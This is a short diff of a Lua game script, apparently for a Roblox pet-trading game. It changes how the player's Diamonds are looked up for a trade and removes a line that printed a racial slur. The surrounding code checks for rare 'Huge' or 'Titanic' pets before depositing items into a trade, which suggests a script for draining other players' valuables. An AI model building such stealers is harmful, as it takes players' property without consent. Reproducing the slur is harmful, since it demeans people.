@@ -49,7 +49,7 @@ local function DepositPetInTrade()
 end
 
 function AddGemsToTrade()
-    for i, v in pairs(GetSave().Inventory.Currency) do
+    for i, v in pairs(inventory.Currency) do
         if v.id == "Diamonds" then
             GemAmount = v._am
             GemId = i
@@ -156,6 +156,4 @@ if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 			wait(3)
 		end
 	end
-else
-	print("Broke ass nigga")
 end
